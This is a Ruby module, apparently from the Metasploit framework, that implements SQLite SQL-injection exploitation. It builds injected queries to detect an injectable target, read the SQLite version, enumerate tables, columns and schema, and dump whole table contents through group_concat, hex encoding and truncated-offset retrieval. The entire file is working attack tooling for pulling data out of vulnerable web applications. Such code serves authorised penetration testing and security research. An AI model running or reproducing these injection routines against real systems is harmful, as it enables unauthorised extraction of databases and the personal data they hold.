#
# SQLite injection
#
module Msf::Exploit::SQLi::SQLitei
  class Common < Msf::Exploit::SQLi::Common
    ENCODERS = {
      hex: {
        encode: 'hex(^DATA^)',
        decode: proc { |data| Rex::Text.hex_to_raw(data) }
      }
    }.freeze
    def initialize(opts, &query_proc)
      opts[:concat_separator] ||= ','
      if opts[:encoder].is_a?(String) || opts[:encoder].is_a?(Symbol)
        opts[:encoder] = opts[:encoder].downcase.intern
        opts[:encoder] = ENCODERS[opts[:encoder]] if ENCODERS[opts[:encoder]]
      end
      super
    end

    def version
      call_function('sqlite_version()')
    end

    def enum_tables
      run_sql("SELECT group_concat(tbl_name,'#{@concat_separator}') FROM sqlite_master").split(@concat_separator)
    end

    def enum_table_names
      dump_table_fields('sqlite_master', %w[tbl_name], "type='table'").flatten
    end

    def enum_table_columns(table)
      dump_table_fields("pragma_table_info('#{table}')", %w[name]).flatten
    end

    def enum_schema
      dump_table_fields('sqlite_master', %w[sql]).flatten
    end

    def dump_table_fields(table, columns, condition = '', limit = '')
      return '' if columns.empty?

      one_column = columns.length == 1
      if one_column
        columns = "ifnull(#{columns.first},'#{@null_replacement}')"
        columns = @encoder[:encode].sub(/\^DATA\^/, columns) if @encoder
      else
        columns = columns.map do |col|
          col = "ifnull(#{col},'#{@null_replacement}')"
          @encoder ? @encoder[:encode].sub(/\^DATA\^/, col) : col
        end.join("||'#{@second_concat_separator}'||")
      end
      unless condition.empty?
        condition = ' where ' + condition
      end
      num_limit = limit.to_i
      if num_limit > 0
        limit = ' limit ' + num_limit.to_s
      end
      retrieved_data = nil
      if @truncation_length
        retrieved_data = truncated_query('select substr(group_concat(' \
        "cast(#{columns} as blob),'#{@concat_separator}')," \
        "^OFFSET^,#{@truncation_length}) from #{table}#{condition}#{limit}")
      else
        retrieved_data = run_sql("select group_concat(cast(#{columns} as blob),'#{@concat_separator}')" \
        " from #{table}#{condition}#{limit}")
      end
      retrieved_data.split(@concat_separator).map do |row|
        row = row.split(@second_concat_separator)
        @encoder ? row.map { |x| @encoder[:decode].call(x) } : row
      end
    end

    def test_vulnerable
      random_string_len = @truncation_length ? [rand(2..10), @truncation_length].min : rand(2..10)
      random_string = Rex::Text.rand_text_alphanumeric(random_string_len)
      run_sql("select '#{random_string}'") == random_string
    end

    private

    def call_function(function)
      function = @encoder[:encode].sub(/\^DATA\^/, function) if @encoder
      output = nil
      if @truncation_length
        output = truncated_query("select substr(#{function},^OFFSET^,#{@truncation_length})")
      else
        output = run_sql("select #{function}")
      end
      output = @encoder[:decode].call(output) if @encoder
      output
    end

    def hex_encode_strings(query)
      # for more encoding capabilities, run code at the beginning of your block
      query.gsub(/'.*?'|".*?"/) do |match|
        'char(' + match[1..-2].each_codepoint.map { |code| '0x' + code.to_s(16) }.join(',') + ')'
      end
    end
  end
end
